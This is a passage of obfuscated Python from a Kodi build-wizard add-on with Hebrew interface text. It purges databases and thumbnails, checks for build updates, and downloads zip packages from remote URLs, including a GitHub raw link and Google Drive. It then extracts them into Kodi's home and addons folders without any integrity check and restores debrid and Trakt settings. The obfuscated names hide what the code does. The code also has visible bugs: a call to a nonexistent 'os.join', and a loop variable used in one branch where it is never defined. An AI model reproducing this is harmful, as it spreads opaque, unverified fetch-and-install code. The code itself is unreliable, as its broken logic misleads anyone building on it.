		try :#line:5480
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5481
		except :#line:5482
			pass #line:5483
def clearThumb (type =None ):#line:5484
	OOOO0000OOO0O0OOO =wiz .latestDB ('Textures')#line:5485
	if not type ==None :OOOOOO00O0OO0000O =1 #line:5486
	else :OOOOOO00O0OO0000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOOO0000OOO0O0OOO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5487
	if OOOOOO00O0OO0000O ==1 :#line:5488
		try :wiz .removeFile (os .join (DATABASE ,OOOO0000OOO0O0OOO ))#line:5489
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOOO0000OOO0O0OOO )#line:5490
		wiz .removeFolder (THUMBS )#line:5491
	else :wiz .log ('Clear thumbnames cancelled')#line:5493
	wiz .redoThumbs ()#line:5494
def purgeDb ():#line:5496
	OOOOO000O0O000O00 =[];O0O000O0OO0O00O0O =[]#line:5497
	for OO0O00O0OOOO0OOOO ,O000000O0OO0O00OO ,OO0O000O0000OO0OO in os .walk (HOME ):#line:5498
		for OOOO00O0OO0O0OO0O in fnmatch .filter (OO0O000O0000OO0OO ,'*.db'):#line:5499
			if OOOO00O0OO0O0OO0O !='Thumbs.db':#line:5500
				O00000OOOO0O00OO0 =os .path .join (OO0O00O0OOOO0OOOO ,OOOO00O0OO0O0OO0O )#line:5501
				OOOOO000O0O000O00 .append (O00000OOOO0O00OO0 )#line:5502
				O0O00O0OOO000O0OO =O00000OOOO0O00OO0 .replace ('\\','/').split ('/')#line:5503
				O0O000O0OO0O00O0O .append ('(%s) %s'%(O0O00O0OOO000O0OO [len (O0O00O0OOO000O0OO )-2 ],O0O00O0OOO000O0OO [len (O0O00O0OOO000O0OO )-1 ]))#line:5504
	if KODIV >=16 :#line:5505
		OOOO0O0OOOO0OO0OO =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O000O0OO0O00O0O )#line:5506
		if OOOO0O0OOOO0OO0OO ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5507
		elif len (OOOO0O0OOOO0OO0OO )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5508
		else :#line:5509
			for OOO0O0OOO0OO0OOO0 in OOOO0O0OOOO0OO0OO :wiz .purgeDb (OOOOO000O0O000O00 [OOO0O0OOO0OO0OOO0 ])#line:5510
	else :#line:5511
		OOOO0O0OOOO0OO0OO =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O0O000O0OO0O00O0O )#line:5512
		if OOOO0O0OOOO0OO0OO ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5513
		else :wiz .purgeDb (OOOOO000O0O000O00 [OOO0O0OOO0OO0OOO0 ])#line:5514
def fastupdatefirstbuild (O0OOOOO00OOOOOOOO ):#line:5520
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5522
	if ENABLE =='Yes':#line:5523
		if not NOTIFY =='true':#line:5524
			O00OOO00O0OO0O000 =wiz .workingURL (NOTIFICATION )#line:5525
			if O00OOO00O0OO0O000 ==True :#line:5526
				OO0O00000O0OOO0OO ,O0OOOO00O00OOOOO0 =wiz .splitNotify (NOTIFICATION )#line:5527
				if not OO0O00000O0OOO0OO ==False :#line:5529
					try :#line:5530
						OO0O00000O0OOO0OO =int (OO0O00000O0OOO0OO );O0OOOOO00OOOOOOOO =int (O0OOOOO00OOOOOOOO )#line:5531
						checkidupdate ()#line:5532
						wiz .setS ("notedismiss","true")#line:5533
						if OO0O00000O0OOO0OO ==O0OOOOO00OOOOOOOO :#line:5534
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0O00000O0OOO0OO ),xbmc .LOGNOTICE )#line:5535
						elif OO0O00000O0OOO0OO >O0OOOOO00OOOOOOOO :#line:5537
							wiz .log ("[Notifications] id: %s"%str (OO0O00000O0OOO0OO ),xbmc .LOGNOTICE )#line:5538
							wiz .setS ('noteid',str (OO0O00000O0OOO0OO ))#line:5539
							wiz .setS ("notedismiss","true")#line:5540
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5543
					except Exception as O0OO00OOO00O0O000 :#line:5544
						wiz .log ("Error on Notifications Window: %s"%str (O0OO00OOO00O0O000 ),xbmc .LOGERROR )#line:5545
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5547
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00OOO00O0OO0O000 ),xbmc .LOGNOTICE )#line:5548
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5549
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5550
def checkUpdate ():#line:5552
	O0OOO0O00OOOOO000 =wiz .getS ('disableupdate')#line:5553
	O0000000OO0OO00OO =wiz .getS ('buildname')#line:5554
	O00O00OO00OOO0O0O =wiz .getS ('buildversion')#line:5555
	O00OO0OOO0OO0O00O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5556
	OO0OO000O00O0OOO0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O0000000OO0OO00OO ).findall (O00OO0OOO0OO0O00O )#line:5557
	if len (OO0OO000O00O0OOO0 )>0 :#line:5558
		OOO0O0O00OOOOO0O0 =OO0OO000O00O0OOO0 [0 ][0 ]#line:5559
		O0000O0OO00O00O0O =OO0OO000O00O0OOO0 [0 ][1 ]#line:5560
		OOOO00O0O0O0OOOOO =OO0OO000O00O0OOO0 [0 ][2 ]#line:5561
		wiz .setS ('latestversion',OOO0O0O00OOOOO0O0 )#line:5562
		if OOO0O0O00OOOOO0O0 >O00O00OO00OOO0O0O :#line:5563
			if O0OOO0O00OOOOO000 =='false':#line:5564
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(O00O00OO00OOO0O0O ,OOO0O0O00OOOOO0O0 ),xbmc .LOGNOTICE )#line:5565
				notify .updateWindow (O0000000OO0OO00OO ,O00O00OO00OOO0O0O ,OOO0O0O00OOOOO0O0 ,O0000O0OO00O00O0O ,OOOO00O0O0O0OOOOO )#line:5566
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(O00O00OO00OOO0O0O ,OOO0O0O00OOOOO0O0 ),xbmc .LOGNOTICE )#line:5567
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(O00O00OO00OOO0O0O ,OOO0O0O00OOOOO0O0 ),xbmc .LOGNOTICE )#line:5568
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5569
def updatetelemedia (O00OO00OOOO0OO000 ):#line:5570
    from startup import teleupdate #line:5571
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5572
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5573
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5574
    wiz .wizardUpdate ('startup')#line:5575
    checkUpdate ()#line:5577
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi EA','בודק אם קיים עדכון בשבילך')))#line:5578
    time .sleep (15.0 )#line:5579
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5580
     if teleupdate is False :#line:5581
        STARTP2 ()#line:5583
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5584
        if not NOTIFY =='true':#line:5585
            OO000O0O000O000O0 =wiz .workingURL (NOTIFICATION )#line:5586
            if OO000O0O000O000O0 ==True :#line:5587
                OO0O00OO0000OOOO0 ,OOO0000OOO00O000O =wiz .splitNotify (NOTIFICATION )#line:5588
                if not OO0O00OO0000OOOO0 ==False :#line:5589
                    try :#line:5590
                        OO0O00OO0000OOOO0 =int (OO0O00OO0000OOOO0 );O00OO00OOOO0OO000 =int (O00OO00OOOO0OO000 )#line:5591
                        if OO0O00OO0000OOOO0 ==O00OO00OOOO0OO000 :#line:5592
                            if NOTEDISMISS =='false':#line:5593
                                debridit .debridIt ('update','all')#line:5594
                                traktit .traktIt ('update','all')#line:5595
                                checkidupdatetele ()#line:5596
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OO0O00OO0000OOOO0 ),xbmc .LOGNOTICE )#line:5597
                        elif OO0O00OO0000OOOO0 >O00OO00OOOO0OO000 :#line:5598
                            wiz .log ("[Notifications] id: %s"%str (OO0O00OO0000OOOO0 ),xbmc .LOGNOTICE )#line:5599
                            wiz .setS ('noteid',str (OO0O00OO0000OOOO0 ))#line:5600
                            wiz .setS ('notedismiss','false')#line:5601
                            debridit .debridIt ('update','all')#line:5603
                            traktit .traktIt ('update','all')#line:5604
                            checkidupdatetele ()#line:5605
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5607
                    except Exception as OOO0O0OOOOO0O0OOO :#line:5608
                        wiz .log ("Error on Notifications Window: %s"%str (OOO0O0OOOOO0O0OOO ),xbmc .LOGERROR )#line:5609
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5610
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO000O0O000O000O0 ),xbmc .LOGNOTICE )#line:5611
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5612
def checkidupdate ():#line:5616
				wiz .setS ("notedismiss","true")#line:5618
				O000OOO0O000O00OO =wiz .workingURL (NOTIFICATION )#line:5619
				OO00OOOOO000OOO00 =" Kodi Premium"#line:5621
				O0OO0O0OOO00O0OOO =wiz .checkBuild (OO00OOOOO000OOO00 ,'gui')#line:5622
				OO0O0000OOO000OO0 =OO00OOOOO000OOO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5623
				if not wiz .workingURL (O0OO0O0OOO00O0OOO )==True :return #line:5624
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5625
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00OOOOO000OOO00 ),'','אנא המתן')#line:5626
				O0O0OOO0OO0OOO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0O0000OOO000OO0 )#line:5627
				try :os .remove (O0O0OOO0OO0OOO0OO )#line:5628
				except :pass #line:5629
				logging .warning (O0OO0O0OOO00O0OOO )#line:5630
				if 'google'in O0OO0O0OOO00O0OOO :#line:5631
				   O000O00OOOOOOO0OO =googledrive_download (O0OO0O0OOO00O0OOO ,O0O0OOO0OO0OOO0OO ,DP ,wiz .checkBuild (OO00OOOOO000OOO00 ,'filesize'))#line:5632
				else :#line:5635
				  downloader .download (O0OO0O0OOO00O0OOO ,O0O0OOO0OO0OOO0OO ,DP )#line:5636
				xbmc .sleep (100 )#line:5637
				OOOO0O000OOOO00OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOOOO000OOO00 )#line:5638
				DP .update (0 ,OOOO0O000OOOO00OO ,'','אנא המתן')#line:5639
				extract .all (O0O0OOO0OO0OOO0OO ,HOME ,DP ,title =OOOO0O000OOOO00OO )#line:5640
				DP .close ()#line:5641
				wiz .defaultSkin ()#line:5642
				wiz .lookandFeelData ('save')#line:5643
				if KODIV >=18 :#line:5644
					skindialogsettind18 ()#line:5645
				if INSTALLMETHOD ==1 :O0O0000000O00OO00 =1 #line:5648
				elif INSTALLMETHOD ==2 :O0O0000000O00OO00 =0 #line:5649
				else :DP .close ()#line:5650
def checkidupdatetele ():#line:5651
				wiz .setS ("notedismiss","true")#line:5653
				O00OO00O00OOOOOO0 =wiz .workingURL (NOTIFICATION )#line:5654
				OO0OO0OOOOOOOOOO0 =" Kodi Premium"#line:5656
				OO0O0OOO000O0O0O0 =wiz .checkBuild (OO0OO0OOOOOOOOOO0 ,'gui')#line:5657
				O00O00OOO00O00000 =OO0OO0OOOOOOOOOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5658
				if not wiz .workingURL (OO0O0OOO000O0O0O0 )==True :return #line:5659
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5660
				OO0000O00O000O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O00OOO00O00000 )#line:5663
				try :os .remove (OO0000O00O000O0OO )#line:5664
				except :pass #line:5665
				if 'google'in OO0O0OOO000O0O0O0 :#line:5667
				   O0OOOO0O0000OOO0O =googledrive_download (OO0O0OOO000O0O0O0 ,OO0000O00O000O0OO ,DP2 ,wiz .checkBuild (OO0OO0OOOOOOOOOO0 ,'filesize'))#line:5668
				else :#line:5671
				  downloaderbg .download3 (OO0O0OOO000O0O0O0 ,OO0000O00O000O0OO ,DP2 )#line:5672
				xbmc .sleep (100 )#line:5673
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5674
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5676
				extract .all2 (OO0000O00O000O0OO ,HOME ,DP2 )#line:5678
				DP2 .close ()#line:5679
				wiz .defaultSkin ()#line:5680
				wiz .lookandFeelData ('save')#line:5681
				wiz .kodi17Fix ()#line:5682
				if KODIV >=18 :#line:5683
					skindialogsettind18 ()#line:5684
				debridit .debridIt ('restore','all')#line:5689
				traktit .traktIt ('restore','all')#line:5690
				if INSTALLMETHOD ==1 :OOO0000OO0O0O0000 =1 #line:5691
				elif INSTALLMETHOD ==2 :OOO0000OO0O0O0000 =0 #line:5692
				else :DP2 .close ()#line:5693
				OOOO00O0000O0OOO0 =(NOTIFICATION2 )#line:5694
				O0OOO0000O0O0OO0O =urllib2 .urlopen (OOOO00O0000O0OOO0 )#line:5695
				O0O0OO0OO00OO000O =O0OOO0000O0O0OO0O .readlines ()#line:5696
				OO00OOO0OO00O0000 =0 #line:5697
				for O00O00O0OO00O000O in O0O0OO0OO00OO000O :#line:5700
					if O00O00O0OO00O000O .split (' ==')[0 ]=="noreset"or O00O00O0OO00O000O .split ()[0 ]=="noreset":#line:5701
						xbmc .executebuiltin ("ReloadSkin()")#line:5703
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5704
						O00OOO00O0OOOOO00 =(ADDON .getSetting ("message"))#line:5705
						if O00OOO00O0OOOOO00 =='true':#line:5706
							infobuild ()#line:5707
						update_Votes ()#line:5708
						indicatorfastupdate ()#line:5709
					if O00O00O0OO00O000O .split (' ==')[0 ]=="reset"or O00O00O0OO00O000O .split ()[0 ]=="reset":#line:5710
						update_Votes ()#line:5712
						indicatorfastupdate ()#line:5713
						resetkodi ()#line:5714
def gaiaserenaddon ():#line:5715
  O0000OO0000OO0OOO =(ADDON .getSetting ("gaiaseren"))#line:5716
  OO0OO0O0OOOOO00O0 =(ADDON .getSetting ("auto_rd"))#line:5717
  if O0000OO0000OO0OOO =='true'and OO0OO0O0OOOOO00O0 =='true':#line:5718
    OO00OO0O00O0OOOOO =(NEWFASTUPDATE )#line:5719
    OOO0OO00OO0OO00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5720
    O0O0O0OOOO0OO000O =xbmcgui .DialogProgress ()#line:5721
    O0O0O0OOOO0OO000O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5722
    O00OO0OO00OOOO00O =os .path .join (PACKAGES ,'isr.zip')#line:5723
    OOO0O0O0O00O0OO00 =urllib2 .Request (OO00OO0O00O0OOOOO )#line:5724
    OOOOO0000O00OOOO0 =urllib2 .urlopen (OOO0O0O0O00O0OO00 )#line:5725
    O0O0OO0O0OOO0O00O =xbmcgui .DialogProgress ()#line:5727
    O0O0OO0O0OOO0O00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5728
    O0O0OO0O0OOO0O00O .update (0 )#line:5729
    OOOO000O00O0O0000 =open (O00OO0OO00OOOO00O ,'wb')#line:5731
    try :#line:5733
      OOO0O0OOOOOOOO0O0 =OOOOO0000O00OOOO0 .info ().getheader ('Content-Length').strip ()#line:5734
      OOOO0OO000000O00O =True #line:5735
    except AttributeError :#line:5736
          OOOO0OO000000O00O =False #line:5737
    if OOOO0OO000000O00O :#line:5739
          OOO0O0OOOOOOOO0O0 =int (OOO0O0OOOOOOOO0O0 )#line:5740
    O000O000OOOOO0O0O =0 #line:5742
    OO0OOO0000000OO00 =time .time ()#line:5743
    while True :#line:5744
          O00OO00OOOO0OO0O0 =OOOOO0000O00OOOO0 .read (8192 )#line:5745
          if not O00OO00OOOO0OO0O0 :#line:5746
              sys .stdout .write ('\n')#line:5747
              break #line:5748
          O000O000OOOOO0O0O +=len (O00OO00OOOO0OO0O0 )#line:5750
          OOOO000O00O0O0000 .write (O00OO00OOOO0OO0O0 )#line:5751
          if not OOOO0OO000000O00O :#line:5753
              OOO0O0OOOOOOOO0O0 =O000O000OOOOO0O0O #line:5754
          if O0O0OO0O0OOO0O00O .iscanceled ():#line:5755
             O0O0OO0O0OOO0O00O .close ()#line:5756
             try :#line:5757
              os .remove (O00OO0OO00OOOO00O )#line:5758
             except :#line:5759
              pass #line:5760
             break #line:5761
          O0OO0O0O0O0O0000O =float (O000O000OOOOO0O0O )/OOO0O0OOOOOOOO0O0 #line:5762
          O0OO0O0O0O0O0000O =round (O0OO0O0O0O0O0000O *100 ,2 )#line:5763
          O0OO0O0O0OOO000OO =O000O000OOOOO0O0O /(1024 *1024 )#line:5764
          OOO000O0O000O0O00 =OOO0O0OOOOOOOO0O0 /(1024 *1024 )#line:5765
          OO0OO0O00OO00O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0O0O0OOO000OO ,'teal',OOO000O0O000O0O00 )#line:5766
          if (time .time ()-OO0OOO0000000OO00 )>0 :#line:5767
            OO0O0OO00OO00O0O0 =O000O000OOOOO0O0O /(time .time ()-OO0OOO0000000OO00 )#line:5768
            OO0O0OO00OO00O0O0 =OO0O0OO00OO00O0O0 /1024 #line:5769
          else :#line:5770
           OO0O0OO00OO00O0O0 =0 #line:5771
          OO0000O0O00OO00O0 ='KB'#line:5772
          if OO0O0OO00OO00O0O0 >=1024 :#line:5773
             OO0O0OO00OO00O0O0 =OO0O0OO00OO00O0O0 /1024 #line:5774
             OO0000O0O00OO00O0 ='MB'#line:5775
          if OO0O0OO00OO00O0O0 >0 and not O0OO0O0O0O0O0000O ==100 :#line:5776
              O0OOOOOO000OO00OO =(OOO0O0OOOOOOOO0O0 -O000O000OOOOO0O0O )/OO0O0OO00OO00O0O0 #line:5777
          else :#line:5778
              O0OOOOOO000OO00OO =0 #line:5779
          O0OO0000000O0OO00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0OO00OO00O0O0 ,OO0000O0O00OO00O0 )#line:5780
          O0O0OO0O0OOO0O00O .update (int (O0OO0O0O0O0O0000O ),OO0OO0O00OO00O00O ,O0OO0000000O0OO00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5782
    O000O0000OOO0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5785
    OOOO000O00O0O0000 .close ()#line:5788
    extract .all (O00OO0OO00OOOO00O ,O000O0000OOO0000O ,O0O0OO0O0OOO0O00O )#line:5789
    try :#line:5793
      os .remove (O00OO0OO00OOOO00O )#line:5794
    except :#line:5795
      pass #line:5796
def iptvsimpldownpc ():#line:5797
    OOOOO00OO0OO00O0O =(IPTVSIMPL18PC )#line:5799
    OOO0O0O0000O0OO0O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5800
    O0OOOOO0OOO0OOOO0 =xbmcgui .DialogProgress ()#line:5801
    O0OOOOO0OOO0OOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5802
    OOO0OOOOO0OOOOO0O =os .path .join (PACKAGES ,'isr.zip')#line:5803
    OO0000O0O00OO0000 =urllib2 .Request (OOOOO00OO0OO00O0O )#line:5804
    O00OOOOOOOOOO0000 =urllib2 .urlopen (OO0000O0O00OO0000 )#line:5805
    OOOO0000O00O0O000 =xbmcgui .DialogProgress ()#line:5807
    OOOO0000O00O0O000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5808
    OOOO0000O00O0O000 .update (0 )#line:5809
    O00OOOOOO0O0OOOO0 =open (OOO0OOOOO0OOOOO0O ,'wb')#line:5811
    try :#line:5813
      O0O0OO00O00OOOO0O =O00OOOOOOOOOO0000 .info ().getheader ('Content-Length').strip ()#line:5814
      OOOO00OOO000OOOOO =True #line:5815
    except AttributeError :#line:5816
          OOOO00OOO000OOOOO =False #line:5817
    if OOOO00OOO000OOOOO :#line:5819
          O0O0OO00O00OOOO0O =int (O0O0OO00O00OOOO0O )#line:5820
    OOO00000000O00000 =0 #line:5822
    O0O0OO00000OOO000 =time .time ()#line:5823
    while True :#line:5824
          OO00O0O00O0O00OOO =O00OOOOOOOOOO0000 .read (8192 )#line:5825
          if not OO00O0O00O0O00OOO :#line:5826
              sys .stdout .write ('\n')#line:5827
              break #line:5828
          OOO00000000O00000 +=len (OO00O0O00O0O00OOO )#line:5830
          O00OOOOOO0O0OOOO0 .write (OO00O0O00O0O00OOO )#line:5831
          if not OOOO00OOO000OOOOO :#line:5833
              O0O0OO00O00OOOO0O =OOO00000000O00000 #line:5834
          if OOOO0000O00O0O000 .iscanceled ():#line:5835
             OOOO0000O00O0O000 .close ()#line:5836
             try :#line:5837
              os .remove (OOO0OOOOO0OOOOO0O )#line:5838
             except :#line:5839
              pass #line:5840
             break #line:5841
          O0O0O000OO0O0OOOO =float (OOO00000000O00000 )/O0O0OO00O00OOOO0O #line:5842
          O0O0O000OO0O0OOOO =round (O0O0O000OO0O0OOOO *100 ,2 )#line:5843
          O0O0OO0O00O000O00 =OOO00000000O00000 /(1024 *1024 )#line:5844
          OO0O0000O0O0OO0O0 =O0O0OO00O00OOOO0O /(1024 *1024 )#line:5845
          O00O00OO000O0O0O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0OO0O00O000O00 ,'teal',OO0O0000O0O0OO0O0 )#line:5846
          if (time .time ()-O0O0OO00000OOO000 )>0 :#line:5847
            OOOO00O0O00OOOOO0 =OOO00000000O00000 /(time .time ()-O0O0OO00000OOO000 )#line:5848
            OOOO00O0O00OOOOO0 =OOOO00O0O00OOOOO0 /1024 #line:5849
          else :#line:5850
           OOOO00O0O00OOOOO0 =0 #line:5851
          OOO0O0O0000OO0000 ='KB'#line:5852
          if OOOO00O0O00OOOOO0 >=1024 :#line:5853
             OOOO00O0O00OOOOO0 =OOOO00O0O00OOOOO0 /1024 #line:5854
             OOO0O0O0000OO0000 ='MB'#line:5855
          if OOOO00O0O00OOOOO0 >0 and not O0O0O000OO0O0OOOO ==100 :#line:5856
              OO0OOOOO0OO00O0O0 =(O0O0OO00O00OOOO0O -OOO00000000O00000 )/OOOO00O0O00OOOOO0 #line:5857
          else :#line:5858
              OO0OOOOO0OO00O0O0 =0 #line:5859
          OO000OOOOO0OO000O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00O0O00OOOOO0 ,OOO0O0O0000OO0000 )#line:5860
          OOOO0000O00O0O000 .update (int (O0O0O000OO0O0OOOO ),O00O00OO000O0O0O0 ,OO000OOOOO0OO000O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5862
    OO0OO00O0O00OO0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5865
    O00OOOOOO0O0OOOO0 .close ()#line:5868
    extract .all (OOO0OOOOO0OOOOO0O ,OO0OO00O0O00OO0OO ,OOOO0000O00O0O000 )#line:5869
    try :#line:5873
      os .remove (OOO0OOOOO0OOOOO0O )#line:5874
    except :#line:5875
      pass #line:5876
def iptvkodi18idan ():#line:5877
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5879
              OO0OO00O00O0OO0OO ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5882
              O00OOOO0O0O0O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5883
              O00OO00000O0OOO00 =xbmcgui .DialogProgress ()#line:5884
              O00OO00000O0OOO00 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5885
              OO00OO0000O000O00 =os .path .join (O00OOOO0O0O0O0OO0 ,'isr.zip')#line:5886
              OO0000OOO00OO0OOO =urllib2 .Request (OO0OO00O00O0OO0OO )#line:5887
              OOOOO00OOO0OO00OO =urllib2 .urlopen (OO0000OOO00OO0OOO )#line:5888
              O000000O00OO000O0 =xbmcgui .DialogProgress ()#line:5890
              O000000O00OO000O0 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5891
              O000000O00OO000O0 .update (0 )#line:5892
              O0O00OO0O00OOOO0O =open (OO00OO0000O000O00 ,'wb')#line:5894
              try :#line:5896
                O00O0OOO00O000000 =OOOOO00OOO0OO00OO .info ().getheader ('Content-Length').strip ()#line:5897
                O000OO00000O00OOO =True #line:5898
              except AttributeError :#line:5899
                    O000OO00000O00OOO =False #line:5900
              if O000OO00000O00OOO :#line:5902
                    O00O0OOO00O000000 =int (O00O0OOO00O000000 )#line:5903
              OO00O0OO00O0000OO =0 #line:5905
              OOO000000OOOOOOO0 =time .time ()#line:5906
              while True :#line:5907
                    OOOOOO00O0000O00O =OOOOO00OOO0OO00OO .read (8192 )#line:5908
                    if not OOOOOO00O0000O00O :#line:5909
                        sys .stdout .write ('\n')#line:5910
                        break #line:5911
                    OO00O0OO00O0000OO +=len (OOOOOO00O0000O00O )#line:5913
                    O0O00OO0O00OOOO0O .write (OOOOOO00O0000O00O )#line:5914
                    if not O000OO00000O00OOO :#line:5916
                        O00O0OOO00O000000 =OO00O0OO00O0000OO #line:5917
                    if O000000O00OO000O0 .iscanceled ():#line:5918
                       O000000O00OO000O0 .close ()#line:5919
                       try :#line:5920
                        os .remove (OO00OO0000O000O00 )#line:5921
                       except :#line:5922
                        pass #line:5923
                       break #line:5924
                    O0OO000OO000O0OO0 =float (OO00O0OO00O0000OO )/O00O0OOO00O000000 #line:5925
                    O0OO000OO000O0OO0 =round (O0OO000OO000O0OO0 *100 ,2 )#line:5926
                    OO000OO0O0O00000O =OO00O0OO00O0000OO /(1024 *1024 )#line:5927
                    O0000O00OOO0OOO0O =O00O0OOO00O000000 /(1024 *1024 )#line:5928
                    OOOO0OO0000OOOO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO000OO0O0O00000O ,'teal',O0000O00OOO0OOO0O )#line:5929
                    if (time .time ()-OOO000000OOOOOOO0 )>0 :#line:5930
                      OOO0OOO00O00OO00O =OO00O0OO00O0000OO /(time .time ()-OOO000000OOOOOOO0 )#line:5931
                      OOO0OOO00O00OO00O =OOO0OOO00O00OO00O /1024 #line:5932
                    else :#line:5933
                     OOO0OOO00O00OO00O =0 #line:5934
                    OOOO0O0O0OO0OOO0O ='KB'#line:5935
                    if OOO0OOO00O00OO00O >=1024 :#line:5936
                       OOO0OOO00O00OO00O =OOO0OOO00O00OO00O /1024 #line:5937
                       OOOO0O0O0OO0OOO0O ='MB'#line:5938
                    if OOO0OOO00O00OO00O >0 and not O0OO000OO000O0OO0 ==100 :#line:5939
                        O0O0OO000OOOO0000 =(O00O0OOO00O000000 -OO00O0OO00O0000OO )/OOO0OOO00O00OO00O #line:5940
                    else :#line:5941
                        O0O0OO000OOOO0000 =0 #line:5942
                    OO0OO0O000OO0O0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OOO00O00OO00O ,OOOO0O0O0OO0OOO0O )#line:5943
